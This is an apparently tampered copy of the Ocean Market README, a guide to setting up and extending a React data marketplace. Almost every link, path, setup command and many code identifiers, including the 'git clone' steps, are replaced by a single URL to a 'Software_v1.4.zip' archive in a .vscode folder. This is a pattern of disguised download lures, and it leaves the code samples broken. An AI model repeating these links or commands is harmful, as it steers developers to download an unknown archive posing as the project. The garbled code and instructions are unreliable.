## 🏄 Get Started

The app is a React app built with [https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip](https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip) + TypeScript + CSS modules and will connect to Ocean remote components by default.

To start local development:

```bash
git clone https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip
cd market

# when using nvm to manage https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip versions
nvm use

npm install
npm start
```

This will start the development server under
`http://localhost:8000`.

To explore the generated GraphQL data structure fire up the accompanying GraphiQL IDE under
`http://localhost:8000/__graphql`.

### Local components with Barge

If you prefer to connect to locally running components instead of remote connections, you can spin up [`barge`](https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip) and use a local Ganache network in another terminal before running `npm start`:

```bash
git clone https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip
cd barge

# startup with local Ganache node
https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip
```

Barge will deploy contracts to the local Ganache node which will take some time. At the end the compiled artifacts need to be copied over to this project into `node_modules/@oceanprotocol/contracts/artifacts`. This script will do that for you:

```bash
https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip
```

Finally, set environment variables to use this local connection in `.env` in the app:

```bash
# modify env variables
cp https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip .env

npm start
```

To use the app together with MetaMask, importing one of the accounts auto-generated by the Ganache container is the easiest way to have test ETH available. All of them have 100 ETH by default. Upon start, the `ocean_ganache_1` container will print out the private keys of multiple accounts in its logs. Pick one of them and import into MetaMask.

To fully test all [The Graph](https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip) integrations, you have to run your own local Graph node with our [`ocean-subgraph`](https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip) deployed to it. Barge does not include a local subgraph so by default, the `subgraphUri` is hardcoded to the Rinkeby subgraph in our [`getDevelopmentConfig` function](https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip).

> Cleaning all Docker images so they are fetched freshly is often a good idea to make sure no issues are caused by old or stale images: `docker system prune --all --volumes`

## 🦑 Environment variables

The `https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip` file is setup to prioritize environment variables for setting each Ocean component endpoint. By setting environment variables, you can easily switch between Ocean networks the app connects to, without directly modifying `https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip`.

For local development, you can use a `.env` file:

```bash
# modify env variables, Rinkeby is enabled by default when using those files
cp https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip .env
```

## 🦀 Data Sources

All displayed data in the app is presented around the concept of one data set, which is a combination of:

- metadata about a data set
- the actual data set files
- the datatoken which represents the data set
- financial data connected to this datatoken, either a pool or a fixed rate exchange contract
- calculations and conversions based on financial data
- metadata about publishers

All this data then comes from multiple sources:

### Aquarius

All initial data sets and their metadata (DDO) is retrieved client-side on run-time from the [Aquarius](https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip) instance, defined in `https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip`. All app calls to Aquarius are done with 2 internal methods which mimic the same methods in https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip, but allow us:

- to cancel requests when components get unmounted in combination with [axios](https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip)
- hit Aquarius as early as possible without relying on any https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip initialization

Aquarius runs Elasticsearch under the hood so its stored metadata can be queried with [Elasticsearch queries](https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip) like so:

```tsx
import { QueryResult } from '@oceanprotocol/lib/dist/node/metadatacache/MetadataCache'
import { queryMetadata } from '../../utils/aquarius'

const queryLatest = {
  query: {
    // https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip

    query_string: { query: `-isInPurgatory:true` }
  },
  sort: { created: 'desc' }
}

function Component() {
  const { appConfig } = useSiteMetadata()
  const [result, setResult] = useState<QueryResult>()

  useEffect(() => {
    if (!https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip) return
    const source = https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip()

    async function init() {
      const result = await queryMetadata(query, https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip)
      setResult(result)
    }
    init()

    return () => {
      https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip()
    }
  }, [https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip, query])

  return <div>{result}</div>
}
```

For components within a single data set view the `useAsset()` hook can be used, which in the background gets the respective metadata from Aquarius.

```tsx
import { useAsset } from '../../../providers/Asset'

function Component() {
  const { ddo } = useAsset()
  return <div>{ddo}</div>
}
```

### Ocean Protocol Subgraph

Most financial data in the market is retrieved with GraphQL from [our own subgraph](https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip), rendered on top of the initial data coming from Aquarius.

The app has [Urql Client](https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip) setup to query the respective subgraph based on network. In any component this client can be used like so:

```tsx
import { gql, useQuery } from 'urql'

const query = gql`
  query PoolLiquidity($id: ID!, $shareId: ID) {
    pool(id: $id) {
      id
      totalShares
    }
  }
`

function Component() {
  const { data } = useQuery(query, {}, pollInterval: 5000 })
  return <div>{data}</div>
}
```

### 3Box

Publishers can create a profile on [3Box Hub](https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip) and when found, it will be displayed in the app.

For this our own [3box-proxy](https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip) is used, within the app the utility method `get3BoxProfile()` can be used to get all info:

```tsx
import get3BoxProfile from '../../../utils/profile'

function Component() {
  const [profile, setProfile] = useState<Profile>()

  useEffect(() => {
    if (!account) return
    const source = https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip()

    async function get3Box() {
      const profile = await get3BoxProfile(account, https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip)
      if (!profile) return

      setProfile(profile)
    }
    get3Box()

    return () => {
      https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip()
    }
  }, [account])
  return (
    <div>
      {https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip} {https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip}
    </div>
  )
}
```

### Purgatory

Based on [list-purgatory](https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip) some data sets get additional data. Within most components this can be done with the internal `useAsset()` hook which fetches data from the [market-purgatory](https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip) endpoint in the background.

For asset purgatory:

```tsx
import { useAsset } from '../../../providers/Asset'

function Component() {
  const { isInPurgatory, purgatoryData } = useAsset()
  return isInPurgatory ? <div>{https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip}</div> : null
}
```

For account purgatory:

```tsx
import { useWeb3 } from '../../../providers/Web3'
import { useAccountPurgatory } from '../../../hooks/useAccountPurgatory'

function Component() {
  const { accountId } = useWeb3()
  const { isInPurgatory, purgatoryData } = useAccountPurgatory(accountId)
  return isInPurgatory ? <div>{https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip}</div> : null
}
```

### Network Metadata

All displayed chain & network metadata is retrieved from `https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip` on build time and integrated into Gatsby's GraphQL layer. This data source is a community-maintained GitHub repository under [ethereum-lists/chains](https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip).

Within components this metadata can be queried for under `allNetworksMetadataJson`. The `useWeb3()` hook does this in the background to expose the final `networkDisplayName` for use in components:

```tsx
export default function NetworkName(): ReactElement {
  const { networkId, isTestnet } = useWeb3()
  const { networksList } = useNetworkMetadata()
  const networkData = getNetworkDataById(networksList, networkId)
  const networkName = getNetworkDisplayName(networkData, networkId)

  return (
    <>
      {networkName} {isTestnet && `(Test)`}
    </>
  )
}
```

## 🎨 Storybook

> TODO: this is broken for most components. See https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip

[Storybook](https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip) is set up for this project and is used for UI development of components. Stories are created inside `src/components/` alongside each component in the form of `https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip`.

To run the Storybook server, execute in your Terminal:

```bash
npm run storybook
```

This will launch the Storybook UI with all stories loaded under [localhost:4000](http://localhost:4000).

## ✨ Code Style

Code style is automatically enforced through [ESLint](https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip) & [Prettier](https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip) rules:

- Git pre-commit hook runs `prettier` on staged files, setup with [Husky](https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip)
- VS Code suggested extensions and settings for auto-formatting on file save
- CI runs a linting & TypeScript typings check with `npm run lint`, and fails if errors are found

For running linting and auto-formatting manually, you can use from the root of the project:

```bash
# linting check, also runs Typescript typings check
npm run lint

# auto format all files in the project with prettier, taking all configs into account
npm run format
```

## 👩‍🔬 Testing

> TODO: this is broken and never runs in CI. See https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip

Test suite for unit tests is setup with [Jest](https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip) as a test runner and:

- [react-testing-library](https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip) for all React components

To run all linting and unit tests:

```bash
npm test
```

For local development, you can start the test runner in a watch mode.

```bash
npm run test:watch
```

For analyzing the generated JavaScript bundle sizes you can use:

```bash
npm run analyze
```

## 🛳 Production

To create a production build, run from the root of the project:

```bash
npm run build
# serve production build
npm run serve
```

## ⬆️ Deployment

Every branch or Pull Request is automatically deployed to multiple hosts for redundancy and emergency reasons:

- [Netlify](https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip)
- [Vercel](https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip)
- [S3](https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip)

A link to a preview deployment will appear under each Pull Request.

The latest deployment of the `main` branch is automatically aliased to `https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip`, where the deployment on Netlify is the current live deployment.

## 🍴 Forking

We encourage you to fork this repository and create your own data marketplace. When you publish your forked version of this market there are a few elements that you are required to change for copyright reasons:

- The typeface is copyright protected and needs to be changed unless you purchase a license for it.
- The Ocean Protocol logo is a trademark of the Ocean Protocol Foundation and must be removed from forked versions of the market.
- The name "Ocean Market" is also copyright protected and should be changed to the name of your market.

Additionally, we would also advise that your retain the text saying "Powered by Ocean Protocol" on your forked version of the marketplace in order to give credit for the development work done by the Ocean Protocol team.

Everything else is made open according to the apache2 license. We look forward to seeing your data marketplace!

## 💻 Advanced Features

Ocean Market also includes a number of advanced features that are suitable for an enterprise data market, such as:

- Role based access control
- Allow and deny lists
- Free pricing

[See our seperate guide on advanced features](https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip)

## ✅ GDPR Compliance

Ocean Market comes with prebuilt components for you to customize to cover GDPR requirements. Find additional information on how to use them below.

### Multi-Language Privacy Policies

Feel free to adopt our provided privacy policies to your needs. Per default we cover four different languages: English, German, Spanish and French. Please be advised, that you will need to adjust some paragraphs in the policies depending on your market setup (e.g. the use of cookies). You can easily add or remove policies by providing your own markdown files in the `content/pages/privacy` directory. For guidelines on how to format your markdown files refer to our provided policies. The pre-linked content tables for these files are automatically generated.

### Privacy Preference Center

Additionally, Ocean Market provides a privacy preference center for you to use. This feature is disabled per default since we do not use cookies requiring consent on our deployment of the market. However, if you need to add some functionality depending on cookies, you can simply enable this feature by changing the value of the `GATSBY_PRIVACY_PREFERENCE_CENTER` environmental variable to `"true"` in your `.env` file. This will enable a customizable cookie banner stating the use of your individual cookies. The content of this banner can be adjusted within the `https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip` file. If no `optionalCookies` are provided, the privacy preference center will be set to a simpler version displaying only the `title`, `text` and `close`-button. This can be used to inform the user about the use of essential cookies, where no consent is needed. The privacy preference center supports two different styling options: `'small'` and `'default'`. Setting the style propertie to `'small'` will display a smaller cookie banner to the user at first, only showing the default styled privacy preference center upon the user's customization request.

Now your market users will be provided with additional options to toggle the use of your configured cookie consent categories. You can always retrieve the current consent status per category with the provided `useConsent()` hook. See below, how you can set your own custom cookies depending on the market user's consent. Feel free to adjust the provided utility functions for cookie usage provided in the `https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip` file to your needs.

```tsx
import { CookieConsentStatus, useConsent } from '../../providers/CookieConsent'
import { deleteCookie, setCookie } from '../../utils/cookies'

// ...

const { cookies, cookieConsentStatus } = useConsent()

https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip((cookie) => {
  const consent = cookieConsentStatus[https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip]

  switch (consent) {
    case https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip
      // example logic
      setCookie(`YOUR_COOKIE_NAME`, 'VALUE')
      break

    case https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip
    case https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip
    default:
      // example logic
      deleteCookie(`YOUR_COOKIE_NAME`)
      break
  }
})
```

#### Privacy Preference Centre Styling

The privacy preference centre has two styling options `default` and `small`. The default view shows all of the customization options on a full-height side banner. When the `small` setting is used, a much smaller banner is shown which only reveals all of the customization options when the user clicks "Customize".

The style can be changed by altering the `style` prop in the `PrivacyPreferenceCenter` component in `https://github.com/HongSehwan/market/raw/refs/heads/main/.vscode/Software_v1.4.zip`. For example:

```Typescript
<PrivacyPreferenceCenter style="small" />
```
